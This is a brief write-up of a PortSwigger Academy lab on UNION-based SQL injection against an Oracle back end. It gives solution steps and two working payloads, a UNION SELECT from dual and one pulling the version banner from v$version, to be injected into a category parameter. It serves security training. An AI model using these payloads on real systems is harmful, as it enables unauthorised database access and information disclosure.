# Lab: SQL injection attack, querying the database type and version on Oracle

**Official lab:** [Lab: SQL injection attack, querying the database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)

## Lab idea

Practices using an in-band UNION-style SQLi issue to identify the database software version in an Oracle database context.

## Vulnerability in brief
SQL injection (SQLi) is a web vulnerability in which untrusted input changes the meaning of a SQL query made by an application. It commonly occurs when an application builds a query by concatenating user-controlled values into SQL instead of keeping query structure separate from data. Inputs may arrive through form fields, URL parameters, cookies, headers, or other request data. Injection can occur in different query types and positions, not only in a `SELECT` statement's `WHERE` clause.

## Solution idea
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data .
3. Use the following payload to display the database version: '+UNION+SELECT+BANNER,+NULL+FROM+v$version--

## Payloads / key values
- `category`
- `'+UNION+SELECT+'abc','def'+FROM+dual--`
- `'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`

## Official source
- [PortSwigger Academy: Lab: SQL injection attack, querying the database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)
